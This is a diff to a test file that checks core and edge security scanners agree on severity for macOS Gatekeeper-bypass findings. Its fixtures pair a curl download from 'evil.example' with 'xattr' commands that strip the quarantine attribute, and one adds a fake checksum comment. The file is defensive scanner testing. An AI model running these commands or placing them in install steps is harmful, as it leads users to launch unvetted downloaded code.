@@ -122,12 +122,12 @@ describe('core <-> edge gatekeeper_bypass/archive_evasion weight + coefficient e
   })
 })
 
-describe('core <-> edge behavioral fixture parity — gatekeeper_bypass (SMI-6033 Wave 2, Gap 5)', () => {
-  it('xattr -c fires standalone-critical and quarantines on both core and edge', async () => {
+describe('core <-> edge behavioral fixture parity — gatekeeper_bypass (SMI-6033 Wave 2/3, Gap 5)', () => {
+  it('correlated xattr -c fires standalone-critical and quarantines on both core and edge', async () => {
     const coreMod = await import(CORE_SCANNER)
     const edgeMod = await import(NODE_SCANNER)
     const scanner = new coreMod.SecurityScanner()
-    const content = 'xattr -c /Applications/EvilApp.app'
+    const content = 'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -c EvilApp.app'
 
     const coreReport = scanner.scan('parity', content)
     const coreFinding = coreReport.findings.find(
@@ -149,11 +149,13 @@ describe('core <-> edge behavioral fixture parity — gatekeeper_bypass (SMI-603
     ).toBe(true)
   })
 
-  it('xattr -d com.apple.quarantine fires standalone-critical on both core and edge', async () => {
+  it('correlated xattr -d com.apple.quarantine fires standalone-critical on both core and edge', async () => {
     const coreMod = await import(CORE_SCANNER)
     const edgeMod = await import(NODE_SCANNER)
     const scanner = new coreMod.SecurityScanner()
-    const content = 'xattr -d com.apple.quarantine /Applications/EvilApp.app'
+    const content =
+      'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
+      'xattr -d com.apple.quarantine EvilApp.app'
 
     const coreFinding = scanner
       .scan('parity', content)
@@ -165,6 +167,81 @@ describe('core <-> edge behavioral fixture parity — gatekeeper_bypass (SMI-603
 
     expect(coreFinding?.severity).toBe('critical')
     expect(edgeFinding?.severity).toBe('critical')
+  })
+
+  it('uncorrelated xattr (no fetch anywhere) stays medium on both core and edge, regardless of isHighTrustAuthor', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content = 'xattr -d com.apple.quarantine /Applications/EvilApp.app'
+
+    const coreFindingDefault = scanner
+      .scan('parity', content)
+      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
+    const coreFindingTrusted = scanner
+      .scan('parity', content, true)
+      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
+    const edgeResDefault = await edgeMod.scanSkillContent(content)
+    const edgeResTrusted = await edgeMod.scanSkillContent(content, true)
+    const edgeFindingDefault = edgeResDefault.findings.find(
+      (f: { type: string }) => f.type === 'gatekeeper_bypass'
+    )
+    const edgeFindingTrusted = edgeResTrusted.findings.find(
+      (f: { type: string }) => f.type === 'gatekeeper_bypass'
+    )
+
+    expect(coreFindingDefault?.severity).toBe('medium')
+    expect(coreFindingTrusted?.severity).toBe('medium')
+    expect(edgeFindingDefault?.severity).toBe('medium')
+    expect(edgeFindingTrusted?.severity).toBe('medium')
+  })
+
+  it('correlated xattr + isHighTrustAuthor:true downgrades to medium on both core and edge (the carve-out)', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content =
+      'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
+      'xattr -d com.apple.quarantine EvilApp.app'
+
+    const coreReport = scanner.scan('parity', content, true)
+    const coreFinding = coreReport.findings.find(
+      (f: { type: string }) => f.type === 'gatekeeper_bypass'
+    )
+    const edgeRes = await edgeMod.scanSkillContent(content, true)
+    const edgeFinding = edgeRes.findings.find(
+      (f: { type: string }) => f.type === 'gatekeeper_bypass'
+    )
+
+    expect(coreFinding?.severity, 'core severity').toBe('medium')
+    expect(edgeFinding?.severity, 'edge severity must match core').toBe('medium')
+    // A lone medium co-signal-eligible finding does not standalone-quarantine.
+    expect(coreReport.passed, 'core must not quarantine on the carve-out alone').toBe(true)
+    expect(
+      edgeMod.shouldQuarantine(edgeRes),
+      'edge must not quarantine on the carve-out alone'
+    ).toBe(false)
+  })
+
+  it('checksum/signature-verification prose near a correlated, non-high-trust xattr does NOT downgrade — stays critical on both core and edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content =
+      'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
+      '# Verified checksum: sha256:d34db33fd34db33fd34db33fd34db33fd34db33fd34db33fd34db33fd34db33f\n' +
+      'xattr -d com.apple.quarantine EvilApp.app'
+
+    const coreFinding = scanner
+      .scan('parity', content)
+      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
+    const edgeRes = await edgeMod.scanSkillContent(content)
+    const edgeFinding = edgeRes.findings.find(
+      (f: { type: string }) => f.type === 'gatekeeper_bypass'
+    )
+
+    expect(coreFinding?.severity, 'core severity must stay critical').toBe('critical')
+    expect(edgeFinding?.severity, 'edge severity must stay critical').toBe('critical')
   })
 
   // FP control: reading a DIFFERENT attribute is not a bypass, on either side.
